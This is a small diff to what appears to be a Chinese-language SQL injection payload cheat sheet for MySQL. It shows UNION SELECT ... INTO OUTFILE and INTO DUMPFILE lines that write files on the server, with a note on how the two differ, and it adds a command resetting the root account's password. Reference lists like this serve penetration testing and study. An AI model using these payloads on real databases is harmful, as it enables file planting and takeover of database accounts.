@@ -40,4 +40,5 @@ MySQL Payload
     - ``union select 1,1,1 into outfile '/tmp/demo.txt'``
     - ``union select 1,1,1 into dumpfile '/tmp/demo.txt'``
     - dumpfile和outfile不同在于，outfile会在行末端写入新行，会转义换行符，如果写入二进制文件，很可能被这种特性破坏
-
+- Change Password
+    - ``mysql -uroot -e "use mysql;UPDATE user SET password=PASSWORD('newpassword') WHERE user='root';FLUSH PRIVILEGES;"``
